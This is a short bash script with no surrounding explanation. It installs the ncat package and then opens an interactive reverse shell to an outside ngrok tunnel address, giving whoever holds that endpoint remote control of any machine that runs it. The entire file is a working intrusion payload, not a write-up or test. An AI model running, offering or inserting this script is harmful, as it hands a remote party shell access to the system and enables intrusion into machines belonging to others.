#!/bin/bash
yum install -y nmap-ncat
bash -i >& /dev/tcp/0.tcp.jp.ngrok.io/18035 0>&1

